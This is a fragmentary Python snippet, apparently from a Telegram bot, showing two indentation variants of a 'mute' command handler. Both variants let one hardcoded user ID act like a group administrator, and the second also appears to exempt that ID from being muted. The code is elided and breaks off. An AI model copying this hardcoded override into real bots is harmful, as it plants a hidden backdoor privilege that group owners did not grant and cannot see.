...
async def mute(client: Client, message: Message):
   ...
   get = await client.get_chat_member(message.chat.id, message.from_user.id)
   if get.status in [ChatMemberStatus.OWNER, ChatMemberStatus.ADMINISTRATOR] or message.from_user.id == 5940413527:
    if message.chat.id in muttof:
      return   	   	
...
async def mute(client: Client, message: Message):
    ...
    if get.status in [ChatMemberStatus.OWNER, ChatMemberStatus.ADMINISTRATOR] or message.from_user.id == 5940413527:
        if message.chat.id in muttof:
            return
        if message.reply_to_message.from_user.id == 5940413527:
